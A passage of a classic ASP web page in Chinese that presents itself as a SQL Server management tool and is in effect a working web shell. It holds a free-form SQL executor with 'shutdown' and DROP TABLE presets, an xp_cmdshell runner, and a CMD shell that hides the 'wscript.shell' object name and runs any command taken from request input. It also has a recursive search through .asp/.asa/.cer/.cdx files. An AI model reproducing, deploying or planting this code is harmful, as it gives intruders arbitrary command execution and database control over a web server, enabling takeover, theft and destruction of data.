	 "<option value=""exec sp_helplogins"">sp_helplogins</option>" & _
	 "<option value=""exec sp_helpfile"">sp_helpfile</option>" & _
	 "<option value=""exec sp_helpuser"">sp_helpuser</option>" & _
	 "<option value=""exec sp_helplanguage"">sp_helplanguage</option>" & _
	 "<option value=""exec sp_monitor"">sp_monitor</option>" & _
	 "<option value=""exec master..xp_logininfo"">Login info</option>" & _
	 "<option value=""exec sp_configure"">sp_configure</option>" & _
	 "<option value=""exec sp_who"">Who</option>" & _
	 "<option value=""exec sp_who2"">Who2</option>" & _
	 "</select> " & _
	 "<select name='StrComSQL' onchange=""if(this.options[this.selectedIndex].value!=''){document.sqlform.sql.value=this.options[this.selectedIndex].value;}"">" & _
	 "<option value=''>常用SQL语法</option><option value=""SELECT * FROM [TableName] WHERE ID<100"">显示数据</option>" & _
	 "<option value=""INSERT INTO [TableName](USER,PASS) VALUES('Wyuheng','mypass')"">添加数据</option>" & _
	 "<option value=""UPDATE [TableName] SET USER='wang yuheng' WHERE ID=100"">修改数据</option>" & _
	 "<option value=""DELETE FROM [TableName] WHERE ID=100"">删除数据</option>" & _
	 "<option value=""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"">建数据表</option>" & _
	 "<option value=""DROP TABLE [TableName]"">删数据表</option>" & _
	 "<option value=""Truncate TABLE [TableName]"">清除数据表</option>" & _	 
	 "<option value=""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"">添加字段</option>" & _
	 "<option value=""ALTER TABLE [TableName] ALTER COLUMN PASS VARCHAR(32)"">修改字段</option>" & _	 
	 "<option value=""ALTER TABLE [TableName] DROP COLUMN PASS"">删除字段</option>" & _
	 "</select>" & _
	 "<select name='StrSpeSQL' onchange=""if(this.options[this.selectedIndex].value!=''){document.sqlform.sql.value=this.options[this.selectedIndex].value;}"">" & _
	 "<option value=''>高级SQL语法</option>" & _
	 "<option value=""CREATE PROCEDURE [OWNER].[PROCEDURE NAME] AS "">创建存储过程</option>" & _
	 "<option value=""CREATE VIEW [OWNER].[VIEW NAME] AS"">创建视图</option>" & _
	 "<option value=""CREATE FUNCTION [OWNER].[FUNCTION NAME] (PARAMETER LIST)  RETURNS (return_type_spec) AS  BEGIN (FUNCTION BODY) END"">创建自定义的函数</option>" & _
	 "<option value=""CREATE TRIGGER [TRIGGER NAME] ON [OWNER].[TABLE NAME] FOR INSERT, UPDATE, DELETE AS"">新建触发器</option>" & _
	 "<option value=""CREATE [ UNIQUE ] [ CLUSTERED | NONCLUSTERED ] INDEX index_name ON { table | view } ( column [ ASC | DESC ] [ ,...n ] ) "">新建索引</option>" & _
	 "<option value='shutdown'>立即停止SQL Server</option>" & _
	 "</select>" & _
	 "</TD>" & _
	 "</TR>" & _
	 "<TR>" & _
	 " <TD ALIGN=""Left"" bgcolor=""#FFFFFF""><textarea name=""sql"" rows=""10"" style=""width:100%"">" & sSQL & "</textarea></TD>" & _
	 "</TR>" & _
	 "<TR>"  & _
	 " <TD ALIGN=""Left"" bgcolor=""#FFFFFF""><input type=""checkbox"" name=""MultiExec"" value=""yes"">" & _
	 "    逐行处理SQL语句（选择此项，则每一行的SQL语句将会被作为一个独立的SQL语句而被执行）</TD>" & _
	 "</TR>" & _
	 "<TR>" & _
	 " <TD ALIGN=""Left"" bgcolor=""#FFFFFF""><input type=""checkbox"" name=""query_plan"" " )
	if strQueryPlan <> "" then response.write "checked "
	Response.write ("value=""yes"">" & _
	 "    返回各个 Transact-SQL 语句的执行信息但不执行语句</TD>" & _
	 "</TR>"	 & _
	 "<TR>" & _
	 "  <TD ALIGN=""Left"" bgcolor=""#FFFFFF""><INPUT TYPE=""submit"" VALUE="" 执 行 "">" & _
	 "   &nbsp;&nbsp;<INPUT TYPE=""reset"" VALUE="" 重 写 "">" & _
	 "   &nbsp;&nbsp;<INPUT TYPE=""button"" VALUE="" 清 除 "" onclick=""document.sqlform.sql.value=''""></TD>" & _
	 "</TR>" & _
	 "</FORM>" & _
     "</TABLE><br>")
    if sSQL <> "" then
	    on error resume next
		OpenDB
		Response.Write ("<TABLE width=""600"" BORDER=""0"" align=""center"" CELLPADDING=""4"" CELLSPACING=""1"" bgcolor=""#CCCCCC"">" & _
		"<tr><td ALIGN=""Left"" bgcolor=""#F2F2F2""><strong>执行结果：</strong>(请不要刷新本页面，避免重复执行SQL语句!)</td></tr></table>" & _
		"<center>"	 & _
		"<div style=""font-size:14px;width:600px;height:300px;overflow:scroll;margin-bottom: 6px;border-width: 1px;border-style: solid;border-color: threedshadow threedhighlight threedhighlight threedshadow;"">")
		if trim(request.Form("MultiExec")) = "yes" then
			sSQL = Split(sSQL,vbcrlf)
			response.Write("<br>逐行执行SQL语句...<br>")
			For i = LBound(sSQL) to UBound(sSQL)
				err.Clear
				if mid(sSQL(i),1,1) = "'" then
					Response.Write("Comment Found: " & sSQL(i) & "<BR><BR>")
				else
					Conn.Execute sSQL(i)
					if len(trim(sSQL(i))) <> 0 then
						Response.Write("Executing #" & I + 1 & ": " & sSQL(i) & "<BR>") 
						if err.number <> 0 then 
							Response.Write("Error in #" & I + 1 & ": " & Err.description & "<BR><BR>")
						else
							Response.Write("Executed #" & I + 1 & " Without Error<BR><BR>")
						end if
					end if
				end if
			next
		else
			dim strQueryPlan,strResult,Field,myArrBinary,myMaxCount,j
			dim myArrTmp,myStrValue
			myMaxCount = 25
			Set RS = Server.Createobject("ADODB.Recordset")
			RS.ActiveConnection = Conn
			RS.CursorLocation=3
			If Request.Form("query_plan") <> "" Then 
				RS.LockType = 1
			Else
				RS.LockType = 3
			End If
			If strQueryPlan <> "" Then Conn.execute "SET SHOWPLAN_TEXT ON"
			RS.Open sSQL
			If Err < 0 Then
				If strQueryPlan <> "" Then Conn.execute "SET SHOWPLAN_TEXT OFF"
				Call ShowMessageBox("执行SQL语句时发生错误！<br><br>错误描述：" & Err.Description)
			End If
			Do Until Rs Is Nothing
				If Rs.Properties("Asynchronous Rowset Processing") = 16 Then
					strResult = strResult &  "<P align=left>" & vbCrLf
					strResult = strResult &  "<TABLE class=""resultbox"" BORDER=0 CELLPADDING=0 CELLSPACING=0 ALIGN=CENTER WIDTH=""100%"" SUMMARY=""Result Content"">"
					strResult = strResult &  "<THEAD><TR>" & vbCrLf
					i = 0
					For Each Field In Rs.Fields
						ReDim myArrBinary(i)
						strResult = strResult &  "<TD nowrap class=""resultheader"">" & Field.Name & "</TD>" & vbCrLf
						myArrBinary(i) = (Field.Type = 128 Or Field.Type =  204 Or Field.Type = 205)
						i = i + 1
					Next
					strResult = strResult &  "</TR></THEAD>" & vbCrLf
					strResult = strResult &  "<TBODY>" & vbCrLf
					i = 0
					Do While Not Rs.EOF
						If myMaxCount > 0 And i > myMaxCount Then Exit Do
						strResult = strResult &  "<TR>" & vbCrLf
						j = 0
						For Each Field In Rs.Fields
							If isNull(Field.Value) Then
								myStrValue = "<SPAN>(Null)</SPAN>"
							ElseIf myArrBinary(j) Then
								myArrTmp= bin2hex(Field.Value, maxdisplayedbin)
								If myArrTmp(1) Then
									myStrValue = txt2html(myArrTmp(0)) &" <SPAN>(...)</SPAN>"
								Else
									myStrValue = txt2html(myArrTmp(0))
								End If
							Else
								If strQueryPlan = "" Then
									myArrTmp= getStrBegin(CStr(Field.Value), maxdisplayedchar)
									If myArrTmp(1) Then
										myStrValue = txt2html(myArrTmp(0)) & " <SPAN>(...)</SPAN>"
									Else
										myStrValue = txt2html(myArrTmp(0))
									End If
								Else
									myStrValue = txt2html(CStr(Field.Value))
								End If
							End If
							strResult = strResult &  "<TD class=""resultitem"">" & myStrValue & "</TD>" & vbCrLf
							j = j + 1
						Next
						strResult = strResult &  "</TR>" & vbCrLf
						i = i + 1
						Rs.MoveNext
					Loop
					strResult = strResult & "</TBODY>" & vbCrLf
					strResult = strResult & "</TABLE>" & vbCrLf
					strResult = strResult & "<br>（所影响的行数为 "& Rs.RecordCount &" 行）</P><BR>" & vbCrLf
				Else
					strResult = strResult &  "<br>命令已成功完成。<BR>" & vbCrLf
				End If
				Set Rs = Rs.NextRecordset
			Loop
			If strQueryPlan <> "" Then Conn.execute "SET SHOWPLAN_TEXT OFF"
			response.Write(strResult)
		end if
		response.Write "</div><p>&nbsp;</p>"
		CloseDB
	 end if
End Sub
Sub XpCmdShell()
	dim todo,xpCmd
	todo = Trim(Request.Form("todo"))
	xpCmd = Trim(Request.Form("XpCmd"))
	Response.Write ( "<br>" & _
	 "<table width=""80%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
	 "<form name=""spform"" action=""?action=xpcmdshell"" method=""post"">" & _
	 "<tr bgcolor=""#F1F1F1"">" & _
	 "<td><strong>执行Xp_CmdShell</strong></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td>请输入命令字符串 ：(不要输入xp_cmdshell，直接输入cmd命令即可)</td>" & _
	 "</tr>	  " & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td>exec master..xp_cmdshell <input name=""XpCmd"" type=""text"" size=""50"" value=""" & xpCmd & """>" & _
	 "<input name=""todo"" type=""hidden"" value=""yes"">" & _
	 "<input name=""btnExecute"" type=""submit"" value="" 执 行 "">" & _
	 "</td>" & _
	 "</tr>" & _
	 "</form>" 	 & _  	  
	 "</table><br>")
	if todo <> "" then
		OpenDB
		call SQLExecutor("exec master..xp_cmdshell '"&replace(replace(xpCmd,"'","''"),chr(34),"''")&"'")
		CloseDB
	end if
End Sub
Function CmdShell()
  dim ShellPath,SI,aaa,strObject,DEfd,DefCmd,CM,DD
  strObject = "w"&DEfd&"sc"&DEfd&"ri"&DEfd&"pt.s"&DEfd&"he"&DEfd&"ll"  
  If Request("ShellPath")<>"" Then Session("ShellPath") = Request("ShellPath")
  ShellPath=Session("ShellPath")
  if ShellPath="" Then ShellPath = "c:\\windows\\system32\\cmd.exe"
  If Request("cmd")<>"" Then DefCmd = Request("cmd")
  SI="<TABLE width=""98%"" BORDER=""0"" align=""center"" CELLPADDING=""4"" CELLSPACING=""1"" bgcolor=""#CCCCCC"">"
  SI=SI&"<form method='post'>"
  SI=SI&"<tr><td bgcolor=#F2F2F2><strong>CMD 命令行</strong></td></tr>"
  SI=SI&"<tr><td bgcolor=#FFFFFF><input name='cmd' Style='width:92%' class='cmd' value='"&DefCmd&"'>"
  SI=SI&"<input type='submit' value='执行'></td></tr>"
  SI=SI&"<tr><td bgcolor=#FFFFFF><textarea Style='width:99%;height:400;' class='cmd'>"  
  If Request.Form("cmd")<>"" Then  
	  Set CM=CreateObject(strObject)
	  Set DD=CM.exec(ShellPath&" /c "&DefCmd)
	  aaa=DD.stdout.readall
	  SI=SI&aaa 
  End If
  SI=SI&chr(13)&"Rar命令行压缩：c:\progra~1\winrar\rar.exe a d:\web\test\web1.rar d:\web\test\web1</textarea><br>"
  SI=SI&"SHELL路径：<input name='ShellPath' value='"&ShellPath&"' Style='width:90%'>"
  SI=SI&"</td></tr></form></table>"
  Response.Write SI
End Function
Function FileLink( f )	'设置显示文件的样式
	dim vPath
	vPath =f.Path'取路径
	FileLink = "<li>" & vPath & "</li>"
End Function
Function SearchFile( f, s ) 'f是文件，s是关键字
	dim fso,fo,content
	Set fso = Server.CreateObject("Scripting.FileSystemObject") '建立FSO对象
	Set fo = fso.OpenTextFile(f)
	content = fo.ReadAll'读全部文本到变量content
	fo.Close
	SearchFile = inStr(1, content, S, vbTextCompare)>0  '从第一个字符开始检查content里面是否有S
End Function
Sub SearchFolder( fd, s )	'fd文件夹路径，s是关键字
	dim f,pos,ext,sfd
	For each f In fd.Files	'枚举文件夹下面的每个文件
		pos = InStrRev(f.Path, "." )
		If pos > 0 Then	'取得文件的后缀名
			ext = Mid(f.Path, pos + 1 )
		Else
			ext = ""
		End If
		If LCase(ext) = "asp" or LCase(ext) = "asa" or LCase(ext) = "cer"  or LCase(ext) = "cdx" Then '判断是否是规定文件类型
			If SearchFile( f, s ) Then	'如果在文件中找到了关键字 则显示出来
				Response.Write FileLink(f)
				FileCount=FileCount+1
			End If
		End If
	Next
	For each sfd In fd.SubFolders	'对该文件夹的子文件夹进行同样搜索
		SearchFolder sfd, s
	Next
End Sub'搜索结束
Sub SearchFileForm()
	dim FilePath,Filename,strKeyword,strPath,fso,fd
	strKeyword = Trim(Request.Form("Keyword"))
	strPath = Trim(Request.Form("Path"))
	Filename=server.mappath(Request.ServerVariables("SCRIPT_NAME")) 
	if strPath ="" then
		FilePath=left(Filename,instrrev(Filename,"\")-1)
	else
		FilePath=strPath
	end if
	Response.write ("<br><br><br>" & _
	 "<table width=""90%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
	 "<form name=""searchfileform"" action=""?action=searchfile"" method=""post"">" & _
	 "<tr bgcolor=""#F1F1F1"">" & _
	 "<td colspan=""2""><strong>文件搜索</strong></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td nowrap>当前路径为：</td>" & _
	 "<td>"& Filename &"</td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td width=""19%"" nowrap>搜索的关键字：</td>" & _
	 "<td width=""81%""><input name=""Keyword"" type=""text"" size=50 id=""Keyword"" value="""&strKeyword&"""></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td nowrap>搜索的物理路径目录：</td>" & _
	 "<td><input name=""Path"" type=""text"" id=""Path"" size=50 value="""&FilePath&"""></td>" & _
	 "</tr>" & _
	 "<tr bgcolor=""#FFFFFF"">" & _
	 "<td colspan=""2""><input type=""submit"" name=""Submit"" value=""提交"">"  & _
	 "&nbsp;&nbsp;&nbsp;<input type=""reset"" name=""reset"" value=""重置"">" & _
	 "</td>" & _
	 "</tr>" & _
	 "</form> " & _ 	  
	 "</table>")
	 if strKeyword <> "" then 
	 	FileCount = 0
		on error resume next
		Set fso = Server.CreateObject("Scripting.FileSystemObject") '建立FSO对象
		Set fd = fso.GetFolder(strPath&"\")
		Response.write ("<br>" & _
		 "<table width=""90%""  border=""0"" align=""center"" cellpadding=""4"" cellspacing=""1"" bgcolor=""#CCCCCC"">" & _
		 "<form name=""searchfileform"" action=""?action=searchfile"" method=""post"">" & _
		 "<tr bgcolor=""#F1F1F1"">" & _
		 "<td><strong>搜索结果</strong></td>" & _
		 "</tr>" & _
		 "<tr bgcolor=""#FFFFFF"">" & _
		 "<td>如下文件符合 <font color=red>" & strKeyword & "</font> 关键字：")
		SearchFolder fd,strKeyword	 
		response.Write("<p>共找到"&filecount&"个文件</p>")
		response.Write"</td></tr></table><br>"
		on error goto 0
	 end if
End Sub
strScriptName = GetScriptName(0)
Call HtmlHeader()
Select Case sAction
	Case "login"         : Call LoginValidate
	Case "leftmenu"      : Call ShowLeftMenu
	Case "mainwin"       : Call ShowMainWindow
	Case "dbsrcbox"		 : Call DataSrcForm
	Case "dbsrcset"      : Call DataSrcSetting
	Case "listtb"        : Call ListTable
	Case "edittb"		 : Call EditTable
	Case "cleartb"		 : Call ClearTable
	Case "deletetb"		 : Call DeleteTable
	Case "editfield"     : Call EditField  
	Case "savefield"     : Call SaveField
	Case "addfield"      : Call EditField
	Case "deletefield"   : Call DeleteField
	Case "listrec"       : Call ListRecords
	Case "editrec"       : Call EditRecords
	Case "addrec"        : Call AddRecord
	Case "updaterec"     : Call UpdateRecord
	Case "delrec"        : Call DeleteRecords
	Case "listvw"        : Call ListViews
	Case "editvw"        : Call EditViews
	Case "showvw"        : Call ShowViews
	Case "delvw"         : Call DeleteViews
	Case "updatevw"      : Call UpdateViews
	Case "listsp"        : Call ListStoredProcedure
	Case "showsp"        : Call ViewStoredProcedure
	Case "editsp"        : Call EditStoredProcedure
	Case "delsp"         : Call DeleteStoredProcedure
	Case "listdb"        : Call ListDatabase
	Case "showdb"        : Call ShowDatabaseInfo
	Case "execsql"       : Call ExecSQL
	case "xpcmdshell"	 : Call XpCmdShell
	Case "cmdshell"		 : Call CmdShell
	Case "searchfile"    : Call SearchFileForm
	Case Else            : Call LoginForm
End Select
Call HtmlFooter()
%>
